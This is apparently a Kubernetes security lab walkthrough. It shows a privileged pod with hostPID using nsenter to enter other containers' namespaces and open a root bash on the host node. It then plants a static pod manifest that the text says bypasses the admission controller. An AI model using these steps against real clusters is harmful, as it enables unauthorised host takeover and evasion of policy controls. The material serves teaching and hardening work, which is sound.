# Hack Session HostPID (Exploration and Exploitation) 

## Step 1: Start first pod 

```
cd
mkdir -p manifests 
cd manifests
mkdir hostpid
cd hostpid
```

```
nano 01-masterpod.yaml
```

```
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: hostmagic
  name: hostmagic
spec:
  containers:
    - command:
      - nsenter
      - --mount=/proc/1/ns/mnt
      - --
      - /bin/sleep
      - 99d
      image: alpine
      name: me
      securityContext:
        privileged: true # superpower !
  dnsPolicy: ClusterFirst
  hostPID: true
  nodeName: worker1
```

```
kubectl apply -f .
```


## Step 2: Start a second pod on same node 

```
cd
mkdir -p manifests 
cd manifests
mkdir hostpid
cd hostpid
```

```
nano 02-nginx3.yaml
```

```
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: nginx3
  name: nginx3
spec:
  containers:
  - image: nginx
    name: nginx3
  nodeName: worker1
```

```
kubectl apply -f .
```

## Step 3: Find the nginx process and enter into its network namespace 

```
kubectl exec -it hostmagic -- pgrep -a nginx
```

![image](https://github.com/user-attachments/assets/c4cc76ff-45f0-4635-b22e-baf2350c19fe)

```
# ss is like netstat
# show the open ports
# we will go into the network namespace  
kubectl exec -it hostmagic -- nsenter -n -t 153770 ss -ln
```

## Step 4: Getting into the mount namespace 

```
# we can also go into the mount namespace and see the configuration file
kubectl exec -it hostmagic -- nsenter -m -t 153770 cat /etc/nginx/nginx.conf
```

## Step 5: Show the namespaces of the pod (its compounds)

  * That's essentially the container we

```
kubectl exec -it hostmagic -- ls -la /proc/153770/ns
```

## Step 6: Break into the host system 


```
# now open a bash on the host system 
kubectl exec -it hostmagic -- nsenter -a -t 1 bash
```

## Step 7: Sneak In your manifest 

  * This is done by kubelet (bypasses admissionController !)
  * It listens on /etc/kubernetes/manifests folder
  * What we see here is a static pod being created 

```
cd /etc/kubernetes/manifests
nano nginxme.yaml 
```

```
apiVersion: v1
kind: Pod
metadata:
  name: nginxme
spec:
  containers:
    - image: nginx
      name: me

```

## Step 8: On Worker 1: is there new pod now ?  

```
# cli for CRI / used whatever container runtime you have 
crictl
```
![image](https://github.com/user-attachments/assets/85d25a49-1c63-4dd2-94e5-5bcfe34364c1)


## Ref: kubelet reading the folder /etc/kubernetes/manifests is there for backwards compability

  * https://github.com/kubernetes/kubeadm/issues/1541


